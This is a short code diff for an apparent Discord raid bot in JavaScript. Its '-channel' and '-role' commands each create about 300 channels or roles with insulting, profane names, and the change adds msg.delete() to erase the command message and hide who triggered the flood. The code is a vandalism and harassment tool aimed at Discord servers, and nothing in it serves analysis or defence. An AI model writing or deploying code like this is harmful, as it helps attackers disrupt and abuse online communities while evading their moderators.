@@ -9,6 +9,7 @@ const Prefix = '-'
 client.on('message', async msg => {
   if (msg.content === Prefix + 'channel')
   {
+    msg.delete();
     var i;
     for ( i=0  ; i <= 300; i++) // makes 300 channels  named Get Fucked
     {
@@ -19,6 +20,7 @@ client.on('message', async msg => {
   }
   if (msg.content === Prefix + 'role')
   {
+    msg.delete();
 
     for ( i=0  ; i <= 300; i++) // makes 300 roles named dumbass
     {
